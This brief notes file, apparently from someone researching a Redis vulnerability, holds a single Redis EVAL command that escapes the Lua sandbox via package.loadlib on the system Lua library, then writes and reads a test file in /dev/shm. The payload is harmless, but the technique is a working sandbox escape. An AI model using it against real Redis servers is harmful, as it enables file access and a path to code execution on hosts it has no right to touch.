# NOTES

## Redis Vuln

The following still shows the vulnerability but from a lua perspective in that I can write a file!!
```shell
eval 'local io_l = package.loadlib("/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.open("/dev/shm/test.txt","w"); f:write("Hello, World!"); f:close(); f = io.open("/dev/shm/test.txt","r"); local res = f:read("*a"); f:close(); print(res); return res' 0
```

